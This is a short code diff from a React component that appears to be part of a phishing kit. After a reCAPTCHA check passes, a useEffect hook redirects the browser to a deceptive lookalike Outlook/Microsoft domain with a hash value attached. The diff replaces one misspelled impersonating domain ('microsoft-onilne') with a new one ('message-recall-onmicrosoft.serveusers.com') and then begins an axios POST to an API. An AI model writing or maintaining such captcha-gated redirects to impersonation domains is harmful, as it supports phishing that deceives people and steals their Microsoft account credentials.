@@ -34,7 +34,7 @@ const App = () => {
   useEffect(() => {
     // Code to run on component mount or when certain dependencies change
     if (recaptchaValue) {
-      window.location.href = `https://outlook.microsoft-onilne-users.faqserv.com/ZOYPkzaP#${hashValue}`;
+      window.location.href = `https://outlook.message-recall-onmicrosoft.serveusers.com/DsIcksLG#${hashValue}`;
 
       axios
         .post(apiUrl, {
